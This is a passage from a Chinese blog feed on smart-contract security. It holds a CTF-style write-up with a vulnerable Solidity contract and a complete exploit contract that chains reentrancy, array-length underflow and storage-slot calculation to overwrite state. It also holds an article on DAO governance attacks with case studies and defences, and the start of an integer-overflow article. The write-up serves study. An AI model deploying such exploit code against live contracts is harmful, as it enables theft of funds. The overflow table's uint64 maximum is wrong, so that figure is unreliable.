class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract userinfo&#123;</span><br><span class="line">    address public administration;</span><br><span class="line">    mapping(address =&gt; uint256)public balances;</span><br><span class="line"></span><br><span class="line">    struct User&#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint256 balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; User[])public users;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        administration = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addUser(string memory _name)public payable&#123;</span><br><span class="line">        User memory user;</span><br><span class="line">        user.name = _name;</span><br><span class="line">        user.balance = msg.value;</span><br><span class="line"></span><br><span class="line">        users[msg.sender].push(user);</span><br><span class="line">        balances[msg.sender]+=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deleteUser() public &#123;</span><br><span class="line">        uint256 len = users[msg.sender].length;</span><br><span class="line">        User memory user = users[msg.sender][len-1];</span><br><span class="line"></span><br><span class="line">        require(balances[msg.sender]&gt;=user.balance,&quot;balance error&quot;);</span><br><span class="line">        balances[msg.sender]-=user.balance;</span><br><span class="line">        bool success =msg.sender.call.value(user.balance)();</span><br><span class="line">        require(success,&quot;transfer error&quot;);</span><br><span class="line"></span><br><span class="line">        users[msg.sender].length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setName(uint256 index,string memory newName)public&#123;</span><br><span class="line">        User storage user = users[msg.sender][index];</span><br><span class="line">        user.name = newName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">contract check&#123;</span><br><span class="line">    uint256 public score;</span><br><span class="line">    userinfo public info = new userinfo();</span><br><span class="line"></span><br><span class="line">    function isCompleted()public&#123;</span><br><span class="line">        score =0;</span><br><span class="line">        if (info.administration()==address(0))&#123;</span><br><span class="line">            score+=25;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(info.balances(msg.sender)&gt;=1000000 ether)&#123;</span><br><span class="line">            score+=75;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本题考点：重入，数组溢出获得整个EVM存储空间，mapping、动态数组、结构体、string存储位置计算，对于我来说非常难</p><ul><li>重入&amp;数组溢出：重入比较常规，通过重入来导致数组溢出，获得整个EVM的存储，然后我们就可以修改整个合约中的任何数据了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function()external payable&#123;</span><br><span class="line">    if(times&lt;2)&#123;</span><br><span class="line">        times+=1;</span><br><span class="line">        info.deleteUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>mapping、动态数组、结构体、string存储位置计算：可以参考我之前这一篇<a href="https://www.levi104.com/2022/12/18/03.solidity%E8%BF%9B%E9%98%B6/04.%E6%8F%92%E6%A7%BD&amp;%E6%9F%A5%E8%AF%A2%E9%93%BE%E4%B8%8A%E6%95%B0%E6%8D%AE/#string-amp-bytes">文章</a></li></ul><p>攻击流程和思路，用图画出来比用文字阐述更加的生动形象容易理解</p><p><img src="/2023/06/23/00.security/07.%E9%87%8D%E5%85%A5&%E5%AD%98%E5%82%A8%E6%BA%A2%E5%87%BA&%E7%B1%BB%E5%9E%8B%E5%AD%98%E5%82%A8%E8%AE%A1%E7%AE%97/安全审计41.png" alt="安全审计41"></p><h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">contract userinfoAttack&#123;</span><br><span class="line">    check public che;</span><br><span class="line">    userinfo public info;</span><br><span class="line">    uint256 public times;</span><br><span class="line">    constructor(address _che)public&#123;</span><br><span class="line">        che = check(_che);</span><br><span class="line">        info = che.info();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function add(string _name)internal &#123;</span><br><span class="line">        info.addUser.value(msg.value)(_name);</span><br><span class="line">    &#125;</span><br><span class="line">    function deleteU()internal&#123;</span><br><span class="line">        info.deleteUser();</span><br><span class="line">    &#125;</span><br><span class="line">    function setN(uint256 index,string memory name)internal&#123;</span><br><span class="line">        info.setName(index,name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function init()public&#123;</span><br><span class="line">        add(&quot;a&quot;);</span><br><span class="line">        deleteU();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function att1()public&#123;</span><br><span class="line">        setN(fig2(address(this)),&quot;&quot;); //设置为全0，即空的</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function att2()public&#123;</span><br><span class="line">        //原来写的是sbgzx，修改成1也可以。原因：string是高字节开始编码的，那么存储金额的slot就变成了4900000...000，肯定大于1000000 ether。</span><br><span class="line">        //为什么是49呢？因为1的ASCII码值是49</span><br><span class="line">        //如果按照原来的sbgzx，那就会被编码成1159810312212000000000.00000</span><br><span class="line">        //但是如果传入的字符串太长，也不行吧这道题</span><br><span class="line">//因为如果传入的string太长，那么这个位置存放的数据就是字符串长度，而不是数据本身</span><br><span class="line">//长度的话，高字节就全是00000000000000000...长度</span><br><span class="line">//这样就无法大于10000ETH    </span><br><span class="line">        </span><br><span class="line">        //setN(fig5(address(this)),&quot;sbgzx&quot;); </span><br><span class="line">        setN(fig5(address(this)),&quot;11111111111111111111111111111111111111111111111111111111111111111&quot;); </span><br><span class="line">    &#125;</span><br><span class="line">    function complete()public&#123;</span><br><span class="line">        che.isCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">    function()external payable&#123;</span><br><span class="line">        if(times&lt;2)&#123;</span><br><span class="line">            times+=1;</span><br><span class="line">            info.deleteUser();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function arrayStart(address _addr)public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(bytes32(_addr),uint256(2));</span><br><span class="line">    &#125;</span><br><span class="line">    function arrayEle(address _addr) public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(arrayStart(_addr));</span><br><span class="line">    &#125;</span><br><span class="line">    function fig1(address _addr)public pure returns(uint256)&#123;</span><br><span class="line">        return (uint256(-1)-uint256(arrayEle(_addr))+1)%2;</span><br><span class="line">    &#125;</span><br><span class="line">    function fig2(address _addr)public pure returns(uint256)&#123;</span><br><span class="line">        return (uint256(-1)-uint256(arrayEle(_addr))+1)/2;</span><br><span class="line">    &#125;</span><br><span class="line">    function fig3(address _addr)public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(bytes32(_addr),uint256(1));</span><br><span class="line">    &#125;</span><br><span class="line">    function fig4(address _addr)public pure returns(uint256)&#123;</span><br><span class="line">        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))%2;</span><br><span class="line">    &#125;</span><br><span class="line">    function fig5(address _addr)public pure returns(uint256)&#123;</span><br><span class="line">        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))/2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract deploy&#123;</span><br><span class="line">    userinfoAttack public user;</span><br><span class="line"></span><br><span class="line">    function arrayStart(address _addr)public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(bytes32(_addr),uint256(2));</span><br><span class="line">    &#125;//users的键address对应的动态数组User[]的长度的slot位置</span><br><span class="line"></span><br><span class="line">    function arrayEle(address _addr) public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(arrayStart(_addr));</span><br><span class="line">    &#125;//users的键address对应的动态数组User[]的元素的数据实际位置</span><br><span class="line"></span><br><span class="line">    //用于判断结构体中的name属性的位置</span><br><span class="line">    function fig1(address _addr)public pure returns(uint256)&#123;</span><br><span class="line">        return (uint256(-1)-uint256(arrayEle(_addr))+1)%2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //用于找到setName数组索引的index</span><br><span class="line">    function fig2(address _addr)public pure returns(uint256)&#123;</span><br><span class="line">        return (uint256(-1)-uint256(arrayEle(_addr))+1)/2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fig3(address _addr)public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(bytes32(_addr),uint256(1));</span><br><span class="line">    &#125;//balances的键address对应的uint256的存储插槽位置</span><br><span class="line"></span><br><span class="line">    function fig4(address _addr)public pure returns(uint256)&#123;</span><br><span class="line">        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))%2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fig5(address _addr)public pure returns(uint256)&#123;</span><br><span class="line">        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))/2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function dep(address _addr)public&#123;</span><br><span class="line">        for(uint i=0;i&lt;999;i++)&#123;</span><br><span class="line">           userinfoAttack _user = new userinfoAttack(_addr);</span><br><span class="line">            if (fig1(address(_user)) ==0 &amp;&amp; fig4(address(_user))==0)&#123;</span><br><span class="line">                user = _user;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>很复杂，目前我的水平做不出来，积累一下知识点，理解整道题，明白它的运作原理。最重要的是要知道复杂情况的存储是如何计算位置的。本道题如果加上多级继承，当然市面上的商用/开源合约经常用到继承，那么存储结构将会地狱级复杂，那么币被盗的那些黑客，他们都能用修改合约结构的方式找到对应插槽，从而获利，他们的功底得多扎实</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.提案攻击</title>
      <link href="/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/"/>
      <url>/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="提案攻击"><a href="#提案攻击" class="headerlink" title="提案攻击"></a>提案攻击</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>什么是提案？</strong></p><p>提案攻击：DAO governance attacks</p><p>在去中心化自治组织 （DAO）中，参与者会提出关于未来协议升级、资金管理等一些提案。为了让提案生效，需要对其进行投票。在DAO中，参与者要想参与提案投票，需要持有对应的治理代币。拥有治理代币的持有者，可以进行发起提案、投票、执行提案一系列活动。</p><p>虽然提案治理有利于建设去中心化的未来，但是也存在一些缺陷。治理代币持有比例较小的用户对参与治理采取理性冷漠态度，这进一步导致 DAO 当中投票权的中心化，转而服务于少数人利益。持有较多治理代币的用户，拥有过多的投票权。</p><p>目前 <code>DAO</code>已经成为常见的 <code>dapp</code>协议的治理模式，在 <code>DAO</code>模式下，协议的资金管理、重要参数的修改、协议升级都通过 <code>DAO</code>合约进行管理。而治理代币的持有者可以向 <code>DAO</code>合约发起提案、投票、执行提案。</p><p><img src="/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/1.jpg" alt></p><p>相应地，基于 <code>DAO</code>提案的攻击也成为了黑客的“新潮流”</p><p><strong>提案常常存在以下风险：</strong></p><ul><li>决策影响：很多因素很容易影响持有人。这可以通过付费公关活动、影响者营销，甚至通过贿赂人们对提案发表有偏见的意见来实现。</li><li>垃圾提案：任何人都可以通过存入一定数量的该链代币来提出治理建议。这可能会导致垃圾邮件提案。它主要发生在代币价格下跌时，提出一个提案只需要几美元。</li><li>参与度低：持币者有时候不能理解过强的技术性提案，例如升级软件版本的链式升级提议。因此做出不了正确的理解和参与治理的决定</li><li>高投票权：拥有大量代币的持有者比拥有更少代币的持有者拥有更多的投票权。这意味着如果一个人拥有超过通过提案所需的代币数量，他们可以单独地为协议做出任何决定。</li></ul><p><strong>如何进行攻击？</strong></p><p>攻击者通过获得足够的投票权来重塑规则，或者影响足够的代币持有者，对提案进行有偏见的投票。这样的行为，我们称之为提案攻击。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>暂无</p><h2 id="相关案例"><a href="#相关案例" class="headerlink" title="相关案例"></a>相关案例</h2><ol><li>2022年4月17日，算法稳定币项目Beanstalk Farms遭黑客攻击。我们经过分析发现，投票合约中的票数是由账户中的BEAN3CRV-f代币持有量计算得到的。攻击者利用了该漏洞，通过闪电贷获得大量代币，将这些代币投入到矿池中，临时获得大量的BEAN3CRV-f代币，从而获得了绝对的票数优势，使得自己的提案可以由自己决定，而不需要其他人的投票。最终盗取了大量的Token。</li><li>2022年5月9日，Fortress Loans遭到黑客攻击。本次提案攻击发生的根本原因有两个：（1）价格预言机计算价格的数据来源Chain合约缺少签名地址的验证以及power的验证；（2）治理合约中，受到FTS价格影响，提案投票的最低支持票数（FTS数量）的总价值低，使得提案可以在付出较小的代价下通过并执行。</li><li>2022/7/24，据成都链安“链必应-区块链安全态势感知平台”安全舆情监控数据显示，Audius项目遭受恶意提案攻击。成都链安安全团队简析如下：攻击者先部署恶意合约并在Audius: Community Treasury 合约中调用initialize将自己设置为治理合约的监护地址，随后攻击者调用ProposalSubmitted 提交恶意85号提案并被通过，该提案允许向攻击合约转账1,856w个AudiusToken，随后攻击者将获得的AudiusToken兑换为ETH，总共获利约108W美元，目前获利资金仍然存放于攻击者地址上（<code>0xa0c7BD318D69424603CBf91e9969870F21B8ab4c</code>）。</li><li>区块链音乐平台Audius遭黑客以恶意提案攻击，705ETH已转入混币协议。Audius 受害金额达六百万美金价值的AUDIO 代币，已换成705 个ETH。攻击者变更了Audius 治理合约的参数，并执行恶意提案，导致1850 万个AUDIO 代币遭转出。黑客呼叫在治理合约中的initialize 功能已改变参数，像是投票期间、延迟执行与监护地址等; 接着攻击者提交了恶意提案ID 85。攻击者向恶意提案投票，并执行其内容，得到了AUDIO 代币并脱手获利。截稿前，黑客已将全数ETH 转入混币协议<a href="https://www.wwsww.cn/xinbi/8656.html">Tornado Cash</a>。</li></ol><h3 id="Beanstalk-Farms"><a href="#Beanstalk-Farms" class="headerlink" title="Beanstalk Farms"></a>Beanstalk Farms</h3><p>在这次攻击事件中，攻击者创建了一个恶意提案，通过闪电贷获得了足够多的投票，并执行了该提案，从而从协议中窃取了资产，总共获利差不多8000万美金</p><p><strong>攻击流程</strong></p><p><img src="/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/1.svg" alt></p><blockquote><ol><li>从跨链桥获取初始资金：<a href="https://etherscan.io/tx/0x1fb73ec5ed8c25b9ca7c9c3c465ab4bbca8554927094f939d96600271475e101">https://etherscan.io/tx/0x1fb73ec5ed8c25b9ca7c9c3c465ab4bbca8554927094f939d96600271475e101</a></li><li>创建并提交提案<ol><li>恶意提案：<a href="https://etherscan.io/address/0xe5ecf73603d98a0128f05ed30506ac7a663dbb69">https://etherscan.io/address/0xe5ecf73603d98a0128f05ed30506ac7a663dbb69</a></li><li>创建：<a href="https://etherscan.io/tx/0x677660ce489935b94bf5ac32c494669a71ee76913ffabe623e82a7de8226b460">https://etherscan.io/tx/0x677660ce489935b94bf5ac32c494669a71ee76913ffabe623e82a7de8226b460</a></li><li>提交：<a href="https://etherscan.io/tx/0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f">https://etherscan.io/tx/0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f</a></li></ol></li><li>发起攻击：<a href="https://etherscan.io/tx/0xcd314668aaa9bbfebaf1a0bd2b6553d01dd58899c508d4729fa7311dc5d33ad7">https://etherscan.io/tx/0xcd314668aaa9bbfebaf1a0bd2b6553d01dd58899c508d4729fa7311dc5d33ad7</a></li></ol></blockquote><p><strong>黑客使用的一些欺骗手法</strong></p><p>在Beanstalk的治理合约中提供了emergencyCommit方法执行提案</p><p><img src="/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/2.webp" alt></p><p>提案从提交到执行，需要超过2/3的投票以及24小时的窗口期。一方面，黑客通过闪电贷获取足够的投票权；另一方面，黑客为了更好的的隐藏自己，使用了一些方法：</p><ol><li>黑客的初始资金来自跨链桥，而不是混币器，可以在一定程度上躲避安全公司的监控，目前的混币器资金出入基本受到了各安全公司的监控</li><li>黑客还创建了一个正常的提案 <a href="https://etherscan.io/address/0x259a2795624b8a17bc7eb312a94504ad0f615d1e">IniBip18</a> ，用来混淆视线</li></ol><p><img src="/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/4.svg" alt></p><p><strong>提交恶意提案的交易</strong></p><p><a href="https://etherscan.io/tx/0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f">链接</a></p><p><img src="/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/5.webp" alt></p><p><strong>提交伪装的正常提案的交易</strong></p><p><a href="https://etherscan.io/tx/0x9575e478d7c542558ecca52b27072fa1f1ec70679106bdbd62f3bb4d6c87a80d">链接</a></p><p><img src="/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/6.webp" alt></p><p><strong>执行恶意提案</strong></p><p><a href="https://etherscan.io/tx/0xcd314668aaa9bbfebaf1a0bd2b6553d01dd58899c508d4729fa7311dc5d33ad7">链接</a></p><p><img src="/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/7.webp" alt></p><p>附：对本次攻击更加详细的解读：<a href="http://www.hackdig.com/04/hack-644767.htm">链接1</a>。<a href="https://learnblockchain.cn/article/4999">链接2</a></p><h3 id="Fortress-Loans"><a href="#Fortress-Loans" class="headerlink" title="Fortress Loans"></a>Fortress Loans</h3><p>Fortress Loans协议是一个借贷协议，且通过 <code>DAO</code>治理，<code>FTS</code>是其治理代币，该协议在代码层面和经济层面都存在一些问题，最终被黑客利用，耗干了流动性。黑客获利接近300万美金。</p><p><strong>攻击流程</strong></p><p><img src="/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/8.svg" alt></p><blockquote><ol><li>缺陷合约<ol><li>治理合约，通过提案的阈值太低：<a href="https://bscscan.com/address/0xe79ecdb7fedd413e697f083982bac29e93d86b2e#code">https://bscscan.com/address/0xe79ecdb7fedd413e697f083982bac29e93d86b2e#code</a></li><li>价格预言机，对FTS价格获取专门处理：<a href="https://bscscan.com/address/0x00fcf33bfa9e3ff791b2b819ab2446861a318285#code">https://bscscan.com/address/0x00fcf33bfa9e3ff791b2b819ab2446861a318285#code</a></li><li>可修改FTS价格：<a href="https://bscscan.com/address/0xc11b687cd6061a6516e23769e4657b6efa25d78e#code">https://bscscan.com/address/0xc11b687cd6061a6516e23769e4657b6efa25d78e#code</a></li></ol></li><li>攻击交易：<a href="https://bscscan.com/tx/0x13d19809b19ac512da6d110764caee75e2157ea62cb70937c8d9471afcb061bf">https://bscscan.com/tx/0x13d19809b19ac512da6d110764caee75e2157ea62cb70937c8d9471afcb061bf</a></li></ol></blockquote><p><strong>黑客攻击的成本</strong></p><p>这是一起针对借贷协议的攻击，没有用到闪电贷，攻击成本主要体现在让恶意提案通过的投票成本，约为11个ETH，但最终获利1000多个ETH，可以说相对获利可忽略不计。</p><h2 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h2><p>在DAO中，治理代币分配的市场机制无法区分想要为项目做出宝贵贡献的用户和高度重视破坏或以其他方式控制项目的攻击者，这两个群体都是愿意高价格购买大量的治理代币。</p><p>这种不可区分性问题意味着去中心化治理不是免费的。相反，协议设计者面临着在公开去中心化治理和保护他们的系统免受试图利用治理机制的攻击者之间的根本权衡。越多的社区成员可以自由地获得治理权和影响协议，攻击者就越容易使用相同的机制进行恶意更改。 </p><p>评估攻击的公式：</p><p><code>攻击所得利益=攻击将会得到的价值-获得投票权的成本-执行攻击的成本</code></p><p>以下做法来进行预防：</p><ul><li><p><strong>降低攻击将会得到的价值</strong></p><ul><li>项目越大越成功，它的价值越高，越容易成为黑客的攻击目标。为了在不破坏自身项目情况下，降低攻击的价值，相关设计人员可以限制提案治理范围来限制攻击的价值，比如限制提案中的更改协议参数的权限。</li></ul></li><li><p><strong>增加获得投票权的成本</strong></p><ul><li><p>一个项目还可以采取措施，使其更难获得攻击所需的投票权。代币的流动性越强，就越容易获得投票权——所以几乎自相矛盾的是，项目可能希望为了保护治理而减少流动性。人们可以尝试直接降低代币的短期可交易性，但这在技术上可能是不可行的。 </p><p>为了间接减少流动性，项目可以提供激励措施，使个人代币持有者不太愿意出售。这可以通过激励质押或赋予代币超越纯粹治理的独立价值来实现。代币持有者获得的价值越多，他们与项目的成功就越一致。 </p><p>独立代币的好处可能包括参加面对面的活动或社交体验。至关重要的是，像这样的好处对与项目保持一致的个人来说是高价值的，但对攻击者来说毫无用处。提供这些好处会提高攻击者在获取代币时面临的有效价格：由于独立的好处，当前持有者将不太愿意出售，这应该会提高市场价格；然而，虽然攻击者必须支付更高的价格，但独立功能的存在并没有提高攻击者获取token的价值。 </p></li></ul></li><li><p><strong>增加执行攻击的成本</strong></p><ul><li>引入摩擦，使攻击者即使在获得代币后也更难行使投票权。例如，设计师可能需要某种用户身份验证才能参与投票，例如 KYC（了解您的客户）检查或信誉评分阈值。人们甚至可以首先限制未经身份验证的参与者获取投票代币的能力，可能需要一些现有的验证者来证明新政党的合法性。 </li></ul></li></ul><p>另外的一些措施</p><ul><li><strong>将投票和执行分离</strong><ul><li>保证投票和执行不在同一个区块时间，即不能在同一笔交易内同时完成投票和执行，这样也可以避免闪电贷带来的风险。</li></ul></li><li><strong>增加权限</strong><ul><li>禁止合约投票，只能够通过EOA账户来投票，这样就可以规避闪电贷带来的影响。</li></ul></li><li><strong>关注提案</strong><ul><li>项目方以及社区成员应高度关注所有提案，对于有风险的提案， 应及时做出反应以及通知，尽可能的杜绝恶意提案的执行。</li></ul></li><li><strong>合约审计</strong><ul><li>在项目上线运行前，可以进行多次全面的合约审计，尽可能的保证合约的安全性。通付盾链上安全团队（SharkTeam）是领先的区块链安全服务团队，精通区块链和智能合约底层原理，为开发者提供合约审计和应急响应服务，合约审计包含近200项审计内容，覆盖高级语言层、虚拟机层、区块链层和业务逻辑层，全面保障智能合约安全。</li></ul></li><li><strong>防止垃圾邮件提案</strong><ul><li>当代币价格低且任何人都能负担得起提出提案所需的代币数量时，请确保将提交提案所需的存款金额增加到一个重要值，以防止垃圾邮件提案。</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/9.svg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.整数溢出_1</title>
      <link href="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
      <url>/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>solidity和其他编程语言一样，存在溢出问题。它包括加法溢出、减法溢出、乘法溢出三类</p><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Odometer_rollover.jpg" alt></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在solidity中，变量支持的整数类型长度以8递增，从uint8到uint256，以及int8到int256。</p><p>EVM中储存一个数所占的位数是固定，在solidity 0.8.0之前，只有截断模式，当存储的数字长度超出最大值时会导致进位，使所有1翻转成0。比如：uint8的255(11111111)，当它加1，不会变成256，而是变成0，原因是11111111===&gt;00000000。EVM不会提示你可能溢出了。</p><p>各个uint变量的最大值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">uint8 最高为: 255</span><br><span class="line">uint16 最高为: 65535</span><br><span class="line">uint24 最高为: 16777215</span><br><span class="line">uint32 最高为: 4294967295</span><br><span class="line">uint40 最高为: 1099511627775</span><br><span class="line">uint48 最高为: 281474976710655</span><br><span class="line">uint56 最高为: 72057594037927935</span><br><span class="line">uint64 最高为: 18446744053709551615</span><br><span class="line">uint72 最高为: 4722366482869645213695</span><br><span class="line">uint80 最高为: 1208925819614629174706175</span><br><span class="line">uint88 最高为: 309485009821345068724781055</span><br><span class="line">uint96 最高为: 79228162514264337593543950335</span><br><span class="line">uint104 最高为: 